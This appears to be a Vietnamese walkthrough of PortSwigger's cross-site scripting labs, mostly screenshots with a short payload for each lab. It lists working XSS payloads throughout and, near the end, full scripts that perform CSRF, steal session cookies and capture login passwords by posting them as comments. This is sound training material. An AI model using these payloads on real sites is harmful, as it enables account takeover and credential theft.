Link: https://portswigger.net/web-security/cross-site-scripting

# Lab: Reflected XSS into HTML context with nothing encoded
![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/886b8e2f-6adb-45d9-aa4c-a73a90fb4de5)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/24f11ed2-7422-4367-878c-6154bb15f1bc)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/1ca2b307-3e61-48db-bcf6-f4e67871bae0)

# Lab: Stored XSS into HTML context with nothing encoded
Vào post bất kì comment ```<script>alert(1)</script>```

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/d40e60a6-511b-4284-a74c-2bf3547c518f)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/ba73bcfa-4fa6-43b6-8e1c-f2f0a1ce36cc)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/96037e45-bbe6-4304-a5eb-93ce80e39c56)

=> Done!

# Lab: DOM XSS in document.write sink using source location.search
Ta thấy searchterm đang được để trong 1 thẻ <img>

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/6b7ae5f8-5d9a-49ae-89ad-0bd89da7220c)

break out thẻ img

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/1ab1cf37-d697-4971-b59f-789736f2dd1c)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/075b103c-b179-45ce-bd96-dde213cc6641)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/f943f52f-74a1-4360-b5c3-6ffbdec0f24d)

# Lab: DOM XSS in innerHTML sink using source location.search
Khi thực hiện tìm kiếm thì ta thấy nội dung sẽ nằm trong thẻ <span id=....> </span> 

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/31782be8-a1b5-4e9d-9a7a-476cdbfcccf0)

Sử dụng câu lệnh ```<img src=1 onerror=alert(1)>``` 

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/d7df665e-56e6-433e-86f9-b88a76e7d2b6)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/633e0d17-2876-478b-b050-18c968714f34)

# Lab: DOM XSS in jQuery anchor href attribute sink using location.search source
Khi ta thêm vào URL 1 giá trị bất kỳ ví dụ là "12a" vào sao tham số "returnPath=/". Ta thấy phần /12a được để trong 1 thẻ là ```<a href=...>```

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/0386194b-ac21-4d80-a378-c355512427da)

Ta sử dụng ```javascript:alert(document.cookie)```.  Khi trình duyệt gặp URL bắt đầu bằng "javascript:", nó hiểu rằng phần còn lại của URL là một đoạn mã JavaScript cần được thực thi thay vì điều hướng đến một trang web mới.

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/4f665964-b69c-4f82-a0aa-17c08c006a7d)

Ấn Back để hoàn thành lab!

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/90f53d88-b068-451a-b795-f6e9d76a487f)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/c8a724c6-0eaf-46af-ac8c-8fcd3f7fcc75)

# Lab: DOM XSS in jQuery selector sink using a hashchange event
Go to exploit server

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/fcd68966-9341-4b05-b0a4-0430452d4465)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/da0afb6d-1ac6-4e0a-b688-6516bb375d88)

Store -> View exploit
![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/f47972d1-194a-4498-a1c6-b3bd71479f0b)

hàm print() đã được thực hiện. Quay lại exploit server để gửi tới victim

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/8240103b-33e6-478d-8767-501e097ec085)

# Lab: Reflected XSS into attribute with angle brackets HTML-encoded
Khi search kí tự "h" , ta thấy kí tự "h" được đặc trong 1 thuộc tính là ```value ="h"```

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/72fb2144-0b29-4710-bb19-aa5bf2ec2b09)

Sử dụng ```"onmouseover="alert(1)``` 

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/baae49af-f773-4e5a-bfbb-f97690353b0f)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/10646459-6ffd-4432-8331-547617dd7e6b)

# Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded
Chọn 1 post bất kì và thực hiện bình luận

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/002d7b49-be7c-470c-89f8-ec0dfe21782f)

Ta thấy khi ta điền thông tin vào mục website thì sẽ được lưu vào thẻ ```<a href=...>```

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/776c89e1-269b-478d-8162-2797e8639429)

Tạo 1 comment

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/27d71fff-8501-47be-958d-432a88977b20)

Khi kick vào tên của mình sẽ hiện thông báo alert(1)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/0155cd13-173b-44d6-95a5-136f328f524d)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/4a230de8-e831-4420-b082-882c420c79a5)

# Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded
Ta thấy kí tự ta tìm kiếm được gán vào giá trị của searchterm 

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/7af1b06d-aac8-4921-8dc5-da163a096420)

Sử dụng ```'-alert(1)-'```

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/8f2b3be4-91b5-43fb-8fb1-1f563e50ba11)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/00311f9c-c92f-48c1-947b-c0c1eb36ef5a)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/84e4dfe9-f31e-4979-9c04-0792efbcb4ab)

# Lab: DOM XSS in document.write sink using source location.search inside a select element

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/e120a550-286f-4264-8981-8fb8784d2ef9)

Ta thấy biến "store" lấy giá trị từ tham số storeId trong URL. Hàm document.write sau đó viết một phần tử ```<select>``` chứa các phần tử ```<option>```, trong đó có thể có một ```<option>``` với giá trị của store từ URL nếu tham số storeId tồn tại.

Ta thực hiện chèn đoạn mã ```&storeId="></select><img src=1 onerror=alert(1)>``` vào trong URL và dùng inspect để xem
Mã JavaScript sẽ xử lý giá trị của storeId là ```"></select><img src=1 onerror=alert(1)>```

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/087cb6d9-043c-40ea-976a-c7506a59712f)

=> Trong thẻ select đã có thêm 1 option ```<img..>```

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/4d03fa4a-29af-433a-ac05-cd037107dcc9)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/c236a2ec-0261-4bea-ae5f-771e7ad26dfb)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/ed9ce263-ed2c-4919-8c49-97f7949d6d9f)

# Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/c5fdbb63-544b-4d67-92f8-394bd7052830)

Sử dụng ```{{$on.constructor('alert(1)')()}}```

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/0a7d9028-a766-4a30-a622-7b2cd6941df3)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/522cc85b-0325-4a1a-b962-82ce04ce3f0f)

# Lab: Reflected DOM XSS
Ta thấy web sẽ nhận input bằng "searchResults.js" và máy chủ sẽ phản hồi lại kết quả tìm kiếm

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/d93096c2-f923-47ef-a958-39803ebdaebf)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/c4e51369-0acf-4093-b2d2-57426b1c275a)

Ta thấy mã script đã thoát dấu ngoặc đơn ngoặc kép nhưng dấu "\" thì chưa. Vì vậy ta sử dụng ```\"-alert(1)}//```

kết quả trả về:

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/a827700e-c528-4919-9ddc-f841a0a707ca)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/31874586-25bc-4334-b48c-a96cc6172a74)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/be937639-3a13-46fe-93e3-f2f230587510)

# Lab: Stored DOM XSS

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/4bcfe8ac-fe4b-4517-a7e2-9d4c7c152efc)

Để ngăn chặn XSS, trang web sử dụng hàm JavaScript replace() để mã hóa dấu ngoặc nhọn. Tuy nhiên, khi đối số đầu tiên là một chuỗi thì hàm chỉ thay thế lần xuất hiện đầu tiên

Sử dụng ```<><img src=1 onerror=alert(1)>```

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/0adbbc8e-6571-4aa6-8c9c-afba3e338048)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/7853533d-49ea-4087-b4d7-d00cd4706f26)

# Lab: Reflected XSS into HTML context with most tags and attributes blocked

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/c12281c3-ead5-4d10-b8f5-156096352b41)

Đầu vào không hợp lệ sẽ bị block

Sử dụng Burp Intruder

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/e824667b-5aae-411a-b1d7-de8ed7d1ccc3)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/a069589a-02b6-4c4c-bf12-80bc1c42e6c6)

Vào XSS cheat sheet và ấn "Copy tags to clipboard" để lấy payloads

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/599e0785-786a-4780-9280-71aa389d41cc)

Ấn paste để chèn payloads

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/8045b016-07ce-497a-99da-efe6c80ff314)

Có 2 tag cho phản hồi 200 

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/ef3293e9-1df3-46a5-9f33-6d12a56b11b1)

Ta thử với tag body trước

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/ecf6cc81-be41-42f4-a31c-d774a1121c8c)

Vào XSS cheat sheet và ấn "Copy events to clipboard" để lấy payloads

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/389d2ba4-8f57-4d9f-a461-dcbed06db433)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/7daaa52d-b37a-44f0-9720-5d03c3040594)

Event oneresize có phản hồi là 200

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/b712caaf-e6a4-400b-8db8-76ff0600ff58)

Dùng inspector trong repeater

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/9fbfb2cb-78f1-412a-945d-66a188064634)

Go to exploit server

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/6e487e78-4c09-4b47-8188-5e0eb23960a0)

Store -> Deliver exploit to victim

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/0f4f44d3-1948-4575-863c-7cb2a14d5ac1)

# Lab: Reflected XSS into HTML context with all tags blocked except custom ones
Sử dụng đoạn mã ```<custom-tag onmouseover='alert(1)'>```

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/8d96c81f-1ade-45bc-a53b-5cabc6f05e0c)

Go to exploit server

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/8918fb5f-b77f-43e1-86f0-50087e7a9b41)

Store -> Deliver exploi to victim

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/b170bce5-e169-4de7-be62-b5f4e8977741)

# Lab: Reflected XSS with some SVG markup allowed
Thực hiện brute force tương tự bài lab trước đó

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/0f08ce56-b013-4a78-a0cb-af8e95122437)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/46fa37f1-2a7f-42be-9fe5-6d41d8553138)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/bfe30121-8f5e-49da-a6b1-d9269a9d213b)

=> Có 4 tag cho phản hồi 200

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/f51ddeb4-fd72-4ea7-b83a-c80a7f800122)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/ed38dc94-862b-4c93-8079-31d10488d3af)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/92184960-4fe1-4182-97e7-6659d6012644)

=> onbegin cho phản hồi 200

Sử dụng đoạn mã ```"><svg><animatetransform onbegin=alert(1)>```

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/038ce281-8f35-4ab4-8663-6f494edc6dd7)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/468d75b4-b010-4570-8b43-2e195ba1444b)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/e9d91066-743f-4dbc-ac3a-2209040bd2bc)

# Lab: Reflected XSS in canonical link tag
Thêm đoạn mã ```/?'accesskey='x'onclick='alert(1)``` vào URL

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/a4695394-0768-41e5-9366-fd0790515304)

# Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/2d3019d0-f8e1-45ed-8a36-60eab2e87378)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/eb0114a5-5ce1-410b-9cc3-302f088a2d92)

Nhìn đoạn mã script                   ``` <script>
                        var searchTerms = '<script>alet(1)</script>';``` đã đóng lại và phần document.write lại được hiển thị ra ngoài
![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/0db9ed82-bab9-4826-a744-39de16aa111d)

=> dùng ```</script><script>alert(1)</script>```

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/659e19e9-f209-45d7-b252-b8b760887e41)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/87bd1a00-a956-4635-8d0f-674102d2d447)

# Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/869fa808-feb8-4d5b-87df-d5225264cfde)

Có vẻ không được rồi. kí tự <> đã bị thoát. nhưng "\" thì lại chưa => ```\'-alert(1)//```

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/06b00a6f-74f7-4a39-8d05-ff91d9f6c390)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/146774d2-4f8b-4a66-b33b-81851c6aec0a)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/f5720dce-9010-4053-9199-8d057989a643)

# Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
Thực hiện bình luận

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/51820c53-bd3a-444b-9f03-b3a95f4f507c)

Click vào tên

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/71ac2831-b053-4893-b405-8d09afed4a9c)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/ca826bed-4ab5-4b4e-8edc-423b7c197103)

# Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
Đoạn mã script xử lý giá trị tìm kiếm

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/e2b7dcf1-bc28-4931-affb-69eed7cccc72)

Sử dụng ```${alert(1)}```

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/4e313c32-65d2-4b0f-b737-7e22597dd8e9)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/d5b4d861-121a-4b28-907d-101b4be07d8a)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/f3326932-1552-4506-8061-ed062571c0ba)

# Lab: Exploiting XSS to perform CSRF

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/ee6189d4-ee41-4ae4-99dc-4a27defaea5e)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/991014f4-e03f-469a-966a-f106bed95bcc)

Mã CSRF
```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
Thực hiện bình luận

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/124fca09-f8cf-433a-b44a-4cc24220bf80)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/e1e2c01b-50a6-4247-a9bd-a4d5a84b3b64)

# Lab: Exploiting cross-site scripting to steal cookies

Vào Inspect -> Console 

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/f13c4e53-f22d-493e-90ed-b403cbb7c1c4)

Mã CSRF ( khi không có Burp Professional :< ) 
```
<script>
window.addEventListener('DOMContentLoaded', function(){
var token = document.getElementsByName('csrf')[0].value;
var data = new FormData();

data.append('csrf', token);
data.append('postId', 9);
data.append('comment', document.cookie);
data.append('name', 'hack12');
data.append('email', 'boy123@gmail.com');

fetch('/post/comment', {
method: 'POST',
mode: 'no-cors',
body:data
});
});
</script>
```
Tạo bình luận ở bài post có id là 9

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/be980b2f-c16d-43f8-9dcb-e75ab9e3e523)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/0af29f3e-b086-4b1d-91d3-36091fa5229a)

=> Lấy được cookie

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/419eac3a-2b43-46f9-a88c-394e24cbc956)

Thay cookie vừa lấy được

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/c8403e84-3dde-4d70-9f3b-1b7eadd1d2fa)

Forward => Done!!

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/829f9f7a-3633-4f30-8dbf-10f78fc37aaf)

# Lab: Exploiting cross-site scripting to capture passwords

```
<input type="text" name="username">
<input type="password" name="password" onchange="hax()">

<script>
function hax() {
var token = document.getElementsByName('csrf')[0].value;
var username = document.getElementsByName('username')[0].value;
var password = document.getElementsByName('password')[0].value;

var data = new FormData();
data.append('csrf', token);
data.append('postId', 9);
data.append('comment', `${username}:${password}`);
data.append('name', 'hack');
data.append('email', 'boy12@gmail.com');

fetch('/post/comment', {
method: 'POST',
mode: 'no-cors',
body:data
});
}
</script>
```
![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/d905d003-5133-478c-81ca-68fb499dcbca)

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/bfe957f4-154c-4bc5-b466-8ae33cbbc6d5)

=> administrator:a4vyxxwl36ukw8y6j504

![image](https://github.com/nguyenngocdung18/portswigger/assets/134156226/ea4822cb-753c-47ab-aba9-f00b32bc5919)
